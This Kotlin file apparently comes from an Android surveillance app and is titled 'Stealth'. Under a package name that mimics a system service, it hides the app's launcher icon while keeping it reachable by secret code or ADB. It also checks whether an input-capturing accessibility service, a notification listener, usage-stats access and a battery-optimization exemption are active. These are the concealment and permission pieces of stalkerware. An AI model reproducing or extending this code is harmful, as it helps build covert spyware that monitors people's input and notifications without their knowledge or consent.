package com.system.service.core

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.PowerManager
import android.provider.Settings

/**
 * Stealth utilities — hide app from launcher, disable battery optimization,
 * and check required permissions.
 *
 * IMPORTANT: Hide/show operates on the .SetupLauncher activity-alias,
 * NOT on SetupActivity directly. This ensures the activity can always be
 * launched via secret code, ADB, or from other activities even when hidden.
 */
object Stealth {

    /** The launcher alias component — toggle this to hide/show from launcher. */
    private fun launcherAlias(context: Context): ComponentName {
        return ComponentName(context.packageName, "com.system.service.SetupLauncher")
    }

    /** Hide the app icon from the launcher. */
    fun hideFromLauncher(context: Context) {
        context.packageManager.setComponentEnabledSetting(
            launcherAlias(context),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    /** Show the app icon in the launcher (for re-configuration). */
    fun showInLauncher(context: Context) {
        context.packageManager.setComponentEnabledSetting(
            launcherAlias(context),
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            0
        )
    }

    /** Check if the app is hidden from launcher. */
    fun isHiddenFromLauncher(context: Context): Boolean {
        val state = context.packageManager.getComponentEnabledSetting(launcherAlias(context))
        return state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    }

    /** Check if accessibility service is enabled. */
    fun isAccessibilityEnabled(context: Context): Boolean {
        // Ultimate check: is it actively running?
        if (com.system.service.services.InputAccessibilityService.instance != null) return true

        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        val pkg = context.packageName
        val cls = com.system.service.services.InputAccessibilityService::class.java.name
        val format1 = "$pkg/$cls"
        val format2 = "$pkg/.services.InputAccessibilityService"

        return enabledServices.contains(format1) || enabledServices.contains(format2)
    }

    /** Check if notification listener is enabled. */
    fun isNotificationListenerEnabled(context: Context): Boolean {
        val flat = Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners"
        ) ?: return false
        return flat.contains(context.packageName, ignoreCase = true)
    }

    /** Check if battery optimization is disabled for this app. */
    fun isBatteryOptimized(context: Context): Boolean {
        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        return !pm.isIgnoringBatteryOptimizations(context.packageName)
    }

    /** Check if usage stats permission is granted. */
    fun hasUsageStatsPermission(context: Context): Boolean {
        val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                context.packageName
            )
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                context.packageName
            )
        }
        return mode == android.app.AppOpsManager.MODE_ALLOWED
    }
}
